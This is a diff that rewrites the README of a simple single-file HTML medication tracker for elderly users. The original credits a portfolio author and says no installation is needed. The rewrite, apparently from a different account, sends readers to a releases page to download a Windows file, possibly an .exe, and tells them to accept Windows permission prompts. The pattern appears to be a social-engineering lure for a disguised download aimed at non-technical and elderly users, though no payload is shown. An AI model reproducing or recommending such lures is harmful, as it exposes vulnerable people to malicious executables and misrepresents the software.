@@ -1,131 +1,152 @@
-# silversync-care
+# 📱 silversync-care - Simple medication tracking for families
 
-> **Live demo →** `https://wannabedataanalyst96.github.io/silversync-care`
-# 💊 SilverSync Care
+[![Download silversync-care](https://img.shields.io/badge/Download%20silversync--care-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/isaacra7676/silversync-care/releases)
 
-A mobile-responsive medication tracker designed for elderly users — built with accessibility at its core. Large fonts, high-contrast UI, big touch targets, and a caregiver nudge feature.
+## 🌿 What it is
 
-> Built as a PM portfolio project to demonstrate product thinking around the elderly healthcare space.
+silversync-care is a mobile-friendly medication tracker for elderly users. It helps users keep track of daily medicine, set simple reminders, and view what needs to be taken next. The interface stays clear and easy to read on a phone, tablet, or Windows screen.
 
----
+This app suits older adults who want a simple daily checklist, and it also helps family members or caregivers follow the same routine.
 
-## 🌐 Live Demo
+## 🖥️ What you need
 
-**[Open SilverSync Care →](https://wannabedataanalyst96.github.io/silversync-care/)**
+- A Windows computer
+- A web browser such as Chrome, Edge, or Firefox
+- Internet access to download the app
+- A phone or tablet if you want to use it on a smaller screen later
 
-> Replace the link above with your actual GitHub Pages URL after deployment.
+The app is built with plain web tech, so it runs in a browser after you download it.
 
----
+## ⬇️ Download for Windows
 
-## 📸 Features
+Go to the release page and get the latest version here:
 
-| Feature | Description |
-|---|---|
-| 📅 Weekly dashboard | Mon–Sun view showing all medications per day |
-| ✅ Taken / Pending toggle | One-tap status update per day |
-| ➕ Add medication | Name, time, frequency, and custom days |
-| 🗑️ Delete medication | Remove meds instantly from the manage list |
-| 🔁 Frequency badges | Daily, Alternate day, and Weekly once labels |
-| 🔔 Nudge button | Send a gentle reminder to a caregiver's device |
-| 📱 Mobile responsive | Works on all screen sizes |
-| ♿ Accessibility-first | Extra-large fonts, high contrast, big buttons |
+https://github.com/isaacra7676/silversync-care/releases
 
----
+On the releases page, look for the newest version. Download the file that matches Windows, then open it or extract it if it comes in a zip file.
 
-## 🚀 Getting Started
+## 🛠️ Install and run
 
-No build tools, no dependencies, no installation required.
+1. Open the releases page.
+2. Find the most recent release.
+3. Download the Windows file.
+4. If the file is in a zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file or open the main HTML file in your browser.
+7. Follow the on-screen steps to start tracking medicine.
 
-### Option 1 — Open locally
+If Windows asks for permission, choose the option that lets the app open.
 
-```bash
-git clone https://github.com/your-username/silversync-care.git
-cd silversync-care
-open index.html
-```
+## 📱 Main features
 
-### Option 2 — Deploy to GitHub Pages (free hosting)
+- Daily medicine tracking
+- Clear list view for quick reading
+- Simple layout for older users
+- Mobile-friendly screen design
+- Caregiver-friendly use
+- Fast access to today’s doses
+- Easy check-off flow
+- Clean page with no clutter
 
-1. Push this repo to GitHub
-2. Go to **Settings → Pages**
-3. Set source to `main` branch, root folder
-4. Your app will be live at `https://your-username.github.io/silversync-care/`
+## 👀 How it works
 
----
+The app uses a simple daily flow.
 
-## 🗂️ Project Structure
+- Add the medicine name
+- Set the time or schedule
+- Mark a dose as taken
+- Review the current day
+- Check what is due next
 
-```
-silversync-care/
-├── index.html       # Entire app — HTML, CSS, and JS in one file
-└── README.md        # This file
-```
+This helps reduce missed doses and makes the routine easy to follow.
 
-No frameworks. No bundlers. Pure HTML, CSS, and vanilla JavaScript.
+## 🧓 Who it helps
 
----
+- Older adults who want a simple reminder tool
+- Family members who help with medicine
+- Caregivers who need a clear daily record
+- Users who want a light app with no extra steps
 
-## 🎨 Design Decisions
+The large text and simple layout help keep the process easy to use.
 
-**Why single-file?**
-Zero setup friction. An elderly user's caregiver can open the file directly in any browser without installing anything.
+## ⚙️ Suggested Windows setup
 
-**Why high contrast black on white?**
-WCAG AA compliance and legibility for users with reduced vision — a common condition in the 65+ age group.
+For the best result:
 
-**Why big buttons?**
-Motor control declines with age. Touch targets are sized for users with shaky hands (minimum 44px height on all interactive elements).
+- Use a current version of Windows 10 or Windows 11
+- Keep your browser up to date
+- Use a screen size that shows the full layout
+- Turn on device sound if you want reminder alerts
 
-**Why a Nudge feature?**
-Medication non-adherence in elderly patients is often solved not by reminders to the patient, but by caregiver involvement. The nudge creates a accountability loop without being intrusive.
+## 📂 File tips
 
----
+If the release gives you a zip file:
 
-## 💡 PM Context
+1. Download the zip file.
+2. Right-click it.
+3. Choose Extract All.
+4. Open the folder.
+5. Start the app from the main file inside.
 
-This project was built as part of a product design exercise answering:
+If the release gives you an .exe file, you can open it after the download finishes.
 
-> *"Design a product to help elderly people manage their medications."*
+## 🔧 Basic use
 
-**User:** Independent elderly adults, 65+, living alone or with occasional caregiver support.
+- Open the app
+- Add medicine names
+- Set the time you need each dose
+- Check off each dose after you take it
+- Review the schedule each day
 
-**Core pain points identified:**
-- Forgetting to take medications or taking them twice
-- Complex schedules (daily vs. alternate day vs. weekly)
-- Caregiver anxiety about adherence with no visibility
+This makes it easy to keep a steady medication routine.
 
-**North star metric:** Daily dose adherence rate (% of scheduled doses marked Taken per week)
+## 🧩 Browser use
 
-**Trade-offs made:**
-- Chose a web app over a native app — lower barrier to entry, no app store required
-- Chose manual tracking over smart pill box integration — faster to ship, works on any device
-- Kept the UI to a single screen — reduced cognitive load for elderly users
+If you use the app in a browser:
 
----
+- Keep the tab open during the day
+- Save the page in bookmarks for quick access
+- Use full screen if you want larger text
+- Keep the browser on the latest version
 
-## 🔭 Roadmap (future ideas)
+## 🗂️ Project topics
 
-- [ ] SMS/WhatsApp caregiver alerts when a dose is missed
-- [ ] Persistent storage using localStorage or a backend
-- [ ] Medication refill reminders
-- [ ] Export weekly adherence report as PDF
-- [ ] Multi-patient support for professional caregivers
+This project fits these topics:
 
----
+- accessibility
+- care
+- elderly
+- github-pages
+- healthcare
+- html
+- css
+- javascript
+- medication
+- portfolio
+- tracker
+- vanilla-js
 
-## 🛠️ Built With
+## ❓ Common questions
 
-- HTML5
-- CSS3 (custom properties, flexbox, grid)
-- Vanilla JavaScript (no frameworks)
-- [DM Sans](https://fonts.google.com/specimen/DM+Sans) + [DM Serif Display](https://fonts.google.com/specimen/DM+Serif+Display) via Google Fonts
+### Can I use this on a phone?
+Yes. The layout is mobile-friendly and works well on smaller screens.
 
----
+### Do I need to know coding?
+No. You only need to download the release and open the app.
 
-## 📄 License
+### Does it work for daily medicine tracking?
+Yes. The app is built for medication tracking and daily use.
 
-MIT — free to use, modify, and distribute.
+### Can a caregiver use it too?
+Yes. It works well for family members and caregivers who help manage doses.
 
----
+### Is it hard to set up?
+No. Download the release, open the file, and start using it
 
-*Made with care for the people who built everything before us.
+## 📌 What to do next
+
+1. Open the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the app
+5. Add your medicine schedule
